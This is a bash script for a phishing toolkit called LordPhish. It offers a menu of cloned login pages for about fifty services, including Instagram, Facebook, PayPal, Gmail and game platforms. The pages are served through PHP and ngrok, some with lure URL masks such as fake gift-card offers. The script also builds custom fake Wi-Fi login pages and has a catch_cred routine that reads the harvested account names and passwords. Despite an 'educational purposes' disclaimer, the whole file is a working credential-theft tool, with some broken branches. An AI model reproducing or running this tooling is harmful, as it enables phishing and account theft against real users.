#!/usr/bin/env bash
# Inspired by the linux choice shellphish

# Tunneling opitions:
# ngrok
# Localhost
# LocalHostRun

# Thanks for pages:
# Pages by: Gr3n0xX
# Pages by: Tahmid Rayat
# Pages by: A1S0N
# Pages by: Zeus
# Pages by: Darkmidius
# Pages by: AdvPhidhing devs

# MIT license

# Copyright (c) 2021 Gr3n0xX

# Permission is granted, free of charge, to anyone who obtains a copy
# of this software and associated documentation files (the "Software"), to handle
# in the Software without restriction, including without limitation the rights
# use, copy, modify, merge, publish, distribute, sublicense and / or sell
# copies of the Software and allow the persons to whom the Software is
# provided to do so, subject to the following conditions:

# The above copyright notice and permission notice must be included in all
# copies or substantial parts of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING, BUT NOT LIMITED TO, MERCHANTABILITY GUARANTEES,
# FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT WILL THE
# AUTHORS OR COPYRIGHT HOLDERS ARE RESPONSIBLE FOR ANY CLAIM, DAMAGE OR OTHERWISE
# LIABILITY, WHETHER IN ACTION OF CONTRACT, CRIME OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR WITH THE USE OR OTHER OFFERS OF THE SOFTWARE.
# IF THE SOFTWARE IS PUBLISHED ON GITHUB THE CREDITS OF THE SOFTWARE MAY BE IN THE FORM OF COMMENT, BANNER OR README.md!

reset='\e[0m'
red='\e[1;31m'
gren='\e[1;32m'
Y='\e[1;33m'
B='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
W='\e[1;37m'
P='\e[1;35m'
Green='\e[32m'
ngreen='\e[1;42m'
Gr='\e[5m\e[32m'
Gris='\e[90m'
r='\e[1;91m'
g='\e[1;92m'
y='\e[1;93m'
w='\e[1;39m'
c='\e[1;96m'
b='\e[1;94m'
o='\e[1;33m'
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
blue='\033[1;34m'
W='\033[1;37m'
Green='\033[32m'
Gren='\033[32m'
Gris='\033[90m'
fblue='\e[1;44m'
boldWhite='\e[1;97m'
lightGreen='\e[92m'
boldLightGray='\e[37;1m'
boldYellow='\e[33;1m'
lightRedBackground='\e[101m'
boldWhiteOnLightRed='\e[101m\e[1;97m'

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        printf "${reset}\n"
        printf "${reset} ${cyan}\t CTRL + C Pressed !!\n"
        sleep 2
        printf "${reset}\n"
        printf " ${reset} ${ngreen} Thanks for Using This Tool !!${reset}  ${fblue}>"
        printf " $g[${reset}+${reset} $g]${reset} ${c} Visit github.com/BrunoCiccarino ${reset}"
        printf "${reset}\n"
        exit 1

}              


banner() {
clear
printf "\n"
echo -e "$blue
           . .IIIII             .II
  IIIIIII. I  II  .    II..IIIIIIIIIIIIIIIIIIII
 .  .IIIIII  II          III$cyan  Gr3n0xX$blue IIIIIIIIII.
    .IIIII.III I      IIIIIIIII$cyan Sec$blue IIIIIIIII  I
   .IIIIII$cyan Hacking$blue II  .IIII$cyan LordPhish$blue III. III
    IIIIIII$cyan  From$blue   ' IIIII I IIIIIIIIIIII III I
    .II$cyan     Linux OS$blue   IIIIIIIIIIII  IIIIIIIIII
       I.           .IIIIIIIIIIII   I   II  I
         .IIII        IIIIIIIIIIII     .       I
          IIIII.          IIIIII           . I.
         IIIIIIIII         IIIII             ..I  II .
          IIIIIII          IIII..             IIQII
            IIII           III. I            IIIEIII
            III             I                I  IPI
             II     $cyan  [-]$magenta Hacking$cyan [-]$blue        D   .
             I          $magenta The World$reset
             \n"
echo
echo
printf "      ${boldWhite}  .:.  Version 2.0 Beta  .:.  ${resret}\n"
printf "\n"
printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${resret}${boldYellow} Tool Created by Gr3n0xX ${resret}\n"
printf "\n"
printf "     ${boldWhiteOnLightRed}:: Disclaimer: Developers assume no liability and are not    ::${resret}\n"
printf "     ${boldWhiteOnLightRed}:: responsible for any misuse or damage caused by LordPhish.  ::${resret}\n"
printf "     ${boldWhiteOnLightRed}:: Only use for educational purposes!!                      ::${resret}\n"
printf "\n"
printf "     ${boldWhiteOnLightRed}:: Attacking targets without mutual consent is illegal!      ::${resret}\n"
printf "\n"
}


menu() {
    clear
    printf "\n"
    echo -e "${red}      ╔═══════════╗"
    echo -e "${red}    ╔═╝${W}███████████${red}╚═╗"
    echo -e "${red}   ╔╝${W}███████████████${red}╚╗"
    echo -e "${red}   ║${W}█████${Gr}Gr3n0xX ${reset}${W}████${red}║"
    echo -e "${red}   ║${W}█████████████████${red}║    ${cyan}•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•. ${reset}${red}"
    echo -e "${red}   ║${W}█████████████████${red}║            ${ngreen}${cyan} Lord${reset} ${Green}${red} Phish${reset}${red}"
    echo -e "${red}   ║${W}█${red}╔${W}█████████████${red}╗${W}█${red}║    ${cyan}•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•. ${reset}${red}"
    echo -e "${red}   ╚╦╝${W}███${gren}▒▒${reset}${W}███${gren}▒▒${reset}${W}███${red}╚╦╝    "
    echo -e "${red}   ╔╝${W}██${gren}▒▒▒▒${reset}${W}███${gren}▒▒▒▒${reset}${W}██${red}╚╗     "
    echo -e "${red}   ║${W}██${gren}▒▒▒▒▒${reset}${W}███${gren}▒▒▒▒▒${reset}${W}██${red}|      "
    echo -e "${red}   ║${W}██${gren}▒▒▒▒${reset}${W}█████${gren}▒▒▒▒${reset}${W}██${red}║                               "
    echo -e "${red}   ╚╗${W}███████████████${red}╔╝"
    echo -e "${red}  ╔═╬══╦╝${W}██${gren}▒${reset}${W}█${gren}▒${reset}${W}██${red}╚╦══╝ ${Green}.${Green}▒${Green}.."
    echo -e "${red}  ║${W}█${red}║══║${W}█████████${red}║ ${Green}...${Green}▒${Green}."
    echo -e "${red}  ║${W}█${red}║══║${W}█${red}║${W}██${red}║${W}██${red}║${W}█${red}║　${Green}.${Green}▒${Green}.."
    echo -e "${red}  ║${W}█${red}║══╚═╩══╩╦═╩═╩═╦╗${Green}▒${Green}."
    echo -e "${red} ╔╝${W}█${red}╚══╦═╦══╦╩═╦═╦═╩╝"
    echo -e "${red}╔╝${W}█████${red}║${W}█${red}║${W}██${red}║${W}██${red}║${W}█${red}║"
    echo -e "${red}║${W}██████${red}║${W}█████████${red}║${reset}"
   printf "      ${boldWhite}  .:.  Version 2.0 Beta  .:.   ${reset}\n"
printf "\n"
printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${reset}${boldYellow} Tool Created by Gr3n0xX/Ch4r0nN ${reset}\n"
printf "\n"
printf "${lightGreen}[${boldLightGray}01${lightGreen}]${reset}${cyan} Instagram${reset}      ${lightGreen}[${boldLightGray}18${lightGreen}]${reset}${cyan} eBay   ${reset}          ${lightGreen}[${boldLightGray}35${lightGreen}]${reset}${cyan} Gmail   ${reset}   \n"
printf "${lightGreen}[${boldLightGray}02${lightGreen}]${reset}${cyan} Facebook${reset}       ${lightGreen}[${boldLightGray}19${lightGreen}]${reset}${cyan} lol  ${reset}            ${lightGreen}[${boldLightGray}36${lightGreen}]${reset}${cyan} Tiktok  ${reset}      \n"
printf "${lightGreen}[${boldLightGray}03${lightGreen}]${reset}${cyan} Snapchat${reset}       ${lightGreen}[${boldLightGray}20${lightGreen}]${reset}${cyan} Pinterest   ${reset}     ${lightGreen}[${boldLightGray}37${lightGreen}]${reset}${cyan} Whatsapp ${reset}  \n"
printf "${lightGreen}[${boldLightGray}04${lightGreen}]${reset}${cyan} Twitter${reset}        ${lightGreen}[${boldLightGray}21${lightGreen}]${reset}${cyan} CryptoCurrency${reset}   ${lightGreen}[${boldLightGray}38${lightGreen}]${reset}${cyan} Starbucks ${reset}\n"
printf "${lightGreen}[${boldLightGray}05${lightGreen}]${reset}${cyan} Github${reset}         ${lightGreen}[${boldLightGray}22${lightGreen}]${reset}${cyan} Verizon   ${reset}       ${lightGreen}[${boldLightGray}39${lightGreen}]${reset}${cyan} Firmware ${reset} \n"
printf "${lightGreen}[${boldLightGray}06${lightGreen}]${reset}${cyan} Google${reset}         ${lightGreen}[${boldLightGray}23${lightGreen}]${reset}${cyan} DropBox   ${reset}       ${lightGreen}[${boldLightGray}40${lightGreen}]${reset}${cyan} Gopro ${reset}   \n"
printf "${lightGreen}[${boldLightGray}07${lightGreen}]${reset}${cyan} Spotify${reset}        ${lightGreen}[${boldLightGray}24${lightGreen}]${reset}${cyan} Adobe ID   ${reset}      ${lightGreen}[${boldLightGray}41${lightGreen}]${reset}${cyan} apple${reset} \n"
printf "${lightGreen}[${boldLightGray}08${lightGreen}]${reset}${cyan} Netflix${reset}        ${lightGreen}[${boldLightGray}25${lightGreen}]${reset}${cyan} Shopify   ${reset}       ${lightGreen}[${boldLightGray}42${lightGreen}]${reset}${cyan} Bitcoin${reset}  \n"
printf "${lightGreen}[${boldLightGray}09${lightGreen}]${reset}${cyan} PayPal${reset}         ${lightGreen}[${boldLightGray}26${lightGreen}]${reset}${cyan} Messenger  ${reset}      ${lightGreen}[${boldLightGray}43${lightGreen}]${reset}${cyan} Ytsubs${reset}     \n"
printf "${lightGreen}[${boldLightGray}10${lightGreen}]${reset}${cyan} Origin${reset}         ${lightGreen}[${boldLightGray}27${lightGreen}]${reset}${cyan} GitLab   ${reset}        ${lightGreen}[${boldLightGray}44${lightGreen}]${reset}${cyan} Ofice-365${reset} \n"
printf "${lightGreen}[${boldLightGray}11${lightGreen}]${reset}${cyan} Steam${reset}          ${lightGreen}[${boldLightGray}28${lightGreen}]${reset}${cyan} Twitch   ${reset}        ${lightGreen}[${boldLightGray}45${lightGreen}]${reset}${cyan} Playstation${reset}  \n"
printf "${lightGreen}[${boldLightGray}12${lightGreen}]${reset}${cyan} Yahoo${reset}          ${lightGreen}[${boldLightGray}29${lightGreen}]${reset}${cyan} MySpace   ${reset}       ${lightGreen}[${boldLightGray}46${lightGreen}]${reset}${cyan} Amazon${reset} \n"
printf "${lightGreen}[${boldLightGray}13${lightGreen}]${reset}${cyan} Linkedin${reset}       ${lightGreen}[${boldLightGray}30${lightGreen}]${reset}${cyan} Badoo   ${reset}         ${lightGreen}[${boldLightGray}47${lightGreen}]${reset}${cyan} Yahoo Web${reset}    \n"
printf "${lightGreen}[${boldLightGray}14${lightGreen}]${reset}${cyan} Protonmail${reset}     ${lightGreen}[${boldLightGray}31${lightGreen}]${reset}${cyan} VK   ${reset}            ${lightGreen}[${boldLightGray}48${lightGreen}]${reset}${cyan} Pornhub${reset}    \n"
printf "${lightGreen}[${boldLightGray}15${lightGreen}]${reset}${cyan} Wordpress${reset}      ${lightGreen}[${boldLightGray}32${lightGreen}]${reset}${cyan} Yandex   ${reset}        ${lightGreen}[${boldLightGray}49${lightGreen}]${reset}${cyan} Xvideos${reset}     \n"
printf "${lightGreen}[${boldLightGray}16${lightGreen}]${reset}${cyan} Microsoft${reset}      ${lightGreen}[${boldLightGray}33${lightGreen}]${reset}${cyan} DevianART   ${reset}     ${lightGreen}[${boldLightGray}50${lightGreen}]${reset}${cyan} Games Pages${reset}\n"
printf "${lightGreen}[${boldLightGray}17${lightGreen}]${reset}${cyan} Youtube${reset}        ${lightGreen}[${boldLightGray}34${lightGreen}]${reset}${cyan} StackOverflow${reset}    ${lightGreen}[${boldLightGray}51${lightGreen}]${reset}${cyan} operadoras${reset} \n"
printf "${lightGreen}[${boldLightGray}99${lightGreen}]${reset}${red} Custom ${reset}        ${lightGreen}[${boldLightGray}Y${lightGreen}]${reset}${red} Youtube channel ${reset}  ${lightGreen}[${boldLightGray}T${lightGreen}]${reset}${red} Telegram Group${reset} \n"     
printf "${lightGreen}[${boldLightGray}00${lightGreen}]${reset}${red} Exit${reset}           ${lightGreen}[${boldLightGray}F${lightGreen}]${reset}${red} Follow me one Github${reset}\n"
read -p $' ${red}[${boldLightGray}~${red}]${reset}${lightGreen} Select an option: ${reset}${cyan}' menu_option

case $menu_option in
    1|01)
        server="instagram"
        start1
        ;;
    2|02)
        server="facebook"
        start1
        ;;
    3|03)
        server="snapchat"
        start1
        ;;
    4|04)
        server="twitter"
        mask='unlimited-onedrive-space-for free'
        start1
        ;;
    5|05)
        server="github"
        mask='get-followers-one-github'
        start1
        ;;
    6|06)
        server="google"
        start1
        ;;
    7|07)
        server="spotify"
        start1
        ;;
    8|08)
        server="netflix"
        mask='get-blue-badge-on-twitter-free'
        start1
        ;;
    9|09)
        server="paypal"
        start1
        ;;
    10)
        server="origin"
        start1
        ;;
    11)
        server="steam"
        mask='steam-500-usd-gift-card-free'
        start1
        ;;
    12)
        server="yahoo"
        start1
        ;;
    13)
        server="linkedin"
        start1
        ;;
    14)
        server="protonmail"
        start1
        ;;
    15)
        server="wordpress"
        start1
        ;;
    16)
        server="microsoft"
        start1
        ;;
    17)
        server="youtube"
        start1
        ;;
    18)
        server="ebay"
        start1
        ;;
    19)
        lol
        ;;
    20)
        server="pinterest"
        start1
        ;;
    21)
        server="cryptocurrency"
        start1
        ;;
    22)
        server="verzion"
        start1
        ;;
    23)
        server="dropbox"
        start1
        ;;
    24)
        server="adobe"
        start1
        ;;
    25)
        server="shopfy"
        start1
        ;;
    26)
        server="messenger"
        start1
        ;;
    27)
        server="gitlab"
        start1
        ;;
    28)
        server="twitch"
        start1
        ;;
    29)
        server="myspace"
        start1
        ;;
    30)
        server="badoo"
        start1
        ;;
    31)
        server="vk"
        start1
        ;;
    32)
        server="yandex"
        start1
        ;;
    33)
        server="devianart"
        start1
        ;;
    34)
        server="stackoverflow"
        start1
        ;;
    35)
        server="gmail"
        start1
        ;;
    36)
        printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
        sleep 2 
        menu
        ;;
    37)
        server="whatsapp"
        start1
        ;;
    38)
        server="starbucks"
        start1
        ;;
    39)
        server="firmware"
        start1
        ;;
    40)
        server="gopro"
        start1
        ;;
    41)
        server="apple"
        start1
        ;;
    42)
        server="bitcoin"
        start1
        ;;
    43)
        server="ytsubs"
        start1
        ;;
    44)
        microsoft_ofice
        ;;
    45)
        server="playstation"
        mask='playstation-500-usd-gift-card-free'
        start1
        ;;
    46)
        server="Amazon"
        start1
        ;;
    47)
        server="yahoo_web"
        start1
        ;;
    48)
        server="pornhub"
        start1
        ;;
    49)
        server="xvideos"
        start1
        ;;
    50)
        games
        ;;
    51)
        operadoras
        ;;
    0|00)
        sleep 1
        printf "\e[0m\n"
        printf "\e[0m\n"
        exit 1
        ;;
    99)
        server="create"
        createpage
        start1
        ;;
    Y)
        banner
        am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A
        ;;
    T)
        banner
        am start -a android.intent.action.VIEW https://t.me/Ch33chSec
        ;;
    F)
        banner
        am start -a android.intent.action.VIEW https://github.com/BrunoCiccarino
        ;;
    *)
        printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
        sleep 2 
        menu
        ;;
esac
menu
}

stop() {

# Magic, don't mess
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Run setup.sh, Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Run setup.sh, Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Run setup.sh, Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run setup.sh, Aborting."; exit 1; }

}



games() {
banner
printf " \n"
printf " ${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Call Of Duty${reset}\n"
printf " ${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Free Fire${reset}\n"
printf " ${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} Free Fire Advanced${reset}\n"
printf " ${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} PUBG Mobile${reset}\n"
printf " ${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} Clash Of Clans${reset}\n"

printf "\n"
read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldYellow} Select an option: ${reset}' game

if [[ $game == 1 || $game == 01 ]]; then
server="codm"
start1

elif [[ $game == 2 || $game == 02 ]]; then
server="freefire"
start1

elif [[ $game == 3 || $game == 03 ]]; then
server="freefire2"
start1

elif [[ $game == 4 || $game == 04 ]]; then
server="pubg"
start1

elif [[ $game == 5 || $game == 05 ]]; then
server="coc"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
sleep 1
clear
menu
fi
}


lol(){
banner
printf " \n"
printf "${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Traditional Login Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Create account Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} LOL New Login Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} LOL Old login Page${reset}\n"
printf "${reset}\n"
read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' lol_option

if [[ $lol_option == 1 || $lol_option == 01 ]]; then
server="lol"
start1

elif [[ $lol_option == 2 || $lol_option == 02 ]]; then
server="createLOL"
start1

elif [[ $lol_option == 3 || $lol_option == 03 ]]; then
server="lol"
start1

elif [[ $lol_option == 4 || $lol_option == 04 ]]; then
server="lol"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
sleep 1
clear
menu
fi

}
operadoras () {
    banner
    printf "${boldGreen}[${reset}${boldLightGray}01${reset}${boldGreen}]${reset}${boldCyan} Claro Fake Page${reset}\n"
    printf "${boldGreen}[${reset}${boldLightGray}02${reset}${boldGreen}]${reset}${boldCyan} TP-Link Fake Page${reset}\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
    

if [[ $op_menu == 1 || $op_menu == 01 ]]; then
server="claro"
start1
    

elif [[ $op_menu == 2 || $op_menu == 02 ]]; then
server"tplink"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
menu
fi
}

instagram(){
banner
printf " \n"
printf "${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Traditional Login Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Copyright Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} Mail Confirmation Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} Copyright Infringement Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} IG Autoliker Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}06${reset}${boldRed}]${reset}${boldYellow} IG Followers Page${reset}\n"
printf "${reset}\n"
read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' insta_option

if [[ $insta_option == 1 || $insta_option == 01 ]]; then
server="instagram"
start1

elif [[ $insta_option == 2 || $insta_option == 02 ]]; then
server="cpr"
start1

elif [[ $insta_option == 3 || $insta_option == 03 ]]; then
server="mcp"
start1

elif [[ $insta_option == 4 || $insta_option == 04 ]]; then
server="cip"
start1

elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
server="igauth"
start1

elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
server="instafollowers"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
sleep 1
clear
menu
fi

}

facebook(){
banner
printf " \n"
printf "${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Traditional Login Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Create account${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} Fake Mobile Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} Fake Security page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} Fake Statics Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}06${reset}${boldRed}]${reset}${boldYellow} Fake Messenger Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}07${reset}${boldRed}]${reset}${boldYellow} Fake Advanced Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}08${reset}${boldRed}]${reset}${boldYellow} Fake Lana Holes Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}09${reset}${boldRed}]${reset}${boldYellow} Fake Mia Khalifa Page${reset}\n"
printf "${boldRed}[${reset}${boldLightGray}10${reset}${boldRed}]${reset}${boldYellow} Fake PUBG-lite Page${reset}\n"
printf "${reset}\n"
read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' fb_option

if [[ $fb_option == 1 || $fb_option == 01 ]]; then
server="facebook"
start1

elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 6 || $fb_option == 06 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 8 || $fb_option == 08 ]]; then
server="face_deskStat"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
sleep 1
clear
menu
fi

}

Google() {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google to PC\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Google Advanced pool\e[0m\n"
    
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' google_menu
    
if [[ $google_menu == 1 || $google_menu == 01 ]]; then
server="Google_pc"
start1
    
elif [[ $google_menu == 2 || $google_menu == 02 ]]; then
list_gm

elif [[ $google_menu == 3 || $google_menu == 03 ]]; then
server="advpool"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
menu
fi
}

list_gm() {
    banner
    
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile V2\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' gm_op 
if [[ $option == 1 || $option == 01 ]]; then
server="google_mobile"
start1
    
elif [[ $option == 2 || $option == 02 ]]; then
server="google_mobile"
start1

else
printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
menu
fi
}

microsoft_ofice() {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Excel\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m OneNote\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m PowerPoint\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m SharePoint\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Word\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' ofice_menu
    if [[ $ofice_menu == 1 || $ofice_menu == 01 ]]; then
    server="exel"
    start1
    elif [[ $ofice_menu == 2 || $ofice_menu == 02 ]]; then
    server="onenote"
    start1
    elif [[ $ofice_menu == 3 || $ofice_menu == 03 ]]; then
    server="powerpoint"
    start1
    elif [[ $ofice_menu == 4 || $ofice_menu == 04 ]]; then
    server="sharepoint"
    start1
    elif [[ $ofice_menu == 5 || $ofice_menu == 05 ]]; then
    server="word"
    start1
    else
    printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
    menu
    fi
}

microsoft () {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m XBOX\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Windows Store\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
    
if [[ $op_menu == 1 ]]; then
    server="xbox"
    start1
    elif [[ $op_menu == 2 ]]; then
        server"Microsoft"
        start1
        else
            printf "\e[1;93m [!] Invalid option!\e[0m\n"
            menu
            fi
}

createpage() {
    default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
    cap1="${cap1:-${default_cap1}}"
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
    cap2="${cap2:-${default_cap2}}"
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
    user_text="${user_text:-${default_user_text}}"
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
    pass_text="${pass_text:-${default_pass_text}}"
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
    sub_text="${sub_text:-${default_sub_text}}"

    echo "<!DOCTYPE html>" > webpages/create/login.html
    echo "<html>" >> webpages/create/login.html
    echo "<body bgcolor=\"gray\" text=\"white\">" >> webpages/create/login.html
    IFS=$'\n'
    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> webpages/create/login.html
        IFS=$'\n'
        printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> webpages/create/login.html
        IFS=$'\n'
        printf '<input type="text" name="username" length=64>\n' >> webpages/create/login.html
        IFS=$'\n'
        printf '<br><label>%s: </label>' $pass_text >> webpages/create/login.html
        IFS=$'\n'
        printf '<input type="password" name="password" length=64><br><br>\n' >> webpages/create/login.html
        IFS=$'\n'
        printf '<input value="%s" type="submit"></form>\n' $sub_text >> webpages/create/login.html
        printf '</center>' >> webpages/create/login.html
        printf '<body>\n' >> webpages/create/login.html
        printf '</html>\n' >> webpages/create/login.html
}

catch_cred() {
    account=$(grep -o 'Account:.*' webpages/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' webpages/$server/usernames.txt | cut -d ":" -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
